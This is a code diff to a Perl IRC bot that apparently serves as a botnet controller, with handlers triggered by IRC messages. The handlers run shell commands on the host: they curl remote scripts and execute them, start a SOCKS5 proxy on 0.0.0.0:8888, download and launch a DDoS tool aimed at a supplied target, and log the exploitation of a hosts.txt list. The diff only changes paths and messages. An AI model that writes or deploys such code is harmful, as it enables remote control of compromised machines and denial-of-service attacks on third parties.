@@ -62,17 +62,17 @@ $irc->on(irc_privmsg => sub {
   $irc->write(notice => $noticechan => "[info] Cloaked!\n");
  }
   if ($msg =~ /@.novnc/) {
-  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/novnc/main/.install.sh -o ~/.novnc && bash ~/.novnc >.log");
-  $irc->write(notice => $noticechan => "[info] NoVNC installed use: sudo cat .log\n");
+  system("curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/novnc/main/.install.sh -o ~/.novnc && bash ~/.novnc");
+  $irc->write(notice => $noticechan => "[info] NoVNC installed check terminal for input\n");
  }
    if ($msg =~ /@.socks/) {
   system("if [ -f /usr/bin/apt ]; then apt update && apt install build-essential -y; else yum groupinstall 'Development Tools' -y; fi;");
-  system("git clone https://github.com/ind3p3nd3nt/socks && cd socks && make -j8 && ./socks5server &");
+  system("git clone https://github.com/ind3p3nd3nt/socks && cp -r ./socks/* ./ && make -j8 && ./socks5server &");
   $irc->write(notice => $noticechan => "[info] Socks5 Listening 0.0.0.0:8888\n");
  }
     if ($msg =~ /@.blocknoobs/) {
   system("if [ -f /usr/bin/apt ]; then apt update && apt install build-essential -y; else yum groupinstall 'Development Tools' -y; fi;");
-  system("git clone https://github.com/ind3p3nd3nt/iptables_CIDR_drop.git && cd iptables_CIDR_drop && sh setup.sh &");
+  system("git clone https://github.com/ind3p3nd3nt/iptables_CIDR_drop.git && cp -r ./iptables_CIDR_drop/* ./ && sh setup.sh &");
   $irc->write(notice => $noticechan => "[info] Now blocking noobs all over the world.\n");
  }
     if ($msg =~ /@.fwreset/) {
@@ -139,11 +139,10 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
      push @IRC_RESULTS, $_ foreach split "\n", $r;
      } elsif ($msg =~ /@.ddos ([^\s]+)/) {
      $s->progress("[Info] Installing DDoS Module");
-     my $ip = $1;
-     my $ddos = "curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/ddos/master/ddos.py -o ddos && chmod +x ddos && ./ddos";
+     my $ddos = "curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/ddos/master/ddos.py -o ddos.py && chmod +x ddos.py && ./ddos.py $@";
      my $r = `$ddos`;
      push @IRC_RESULTS, $_ foreach split "\n", $r;
-     $s->progress("[Info] DDoS Module Installed use: sudo ddos arguments...");
+     $s->progress("[Info] DDoS Module Installed use: sudo ddos.py arguments...");
      }
      elsif ($msg =~ /@.exploit/) {
       warn 'Received exploitrun request, exploiting hosts.txt...';
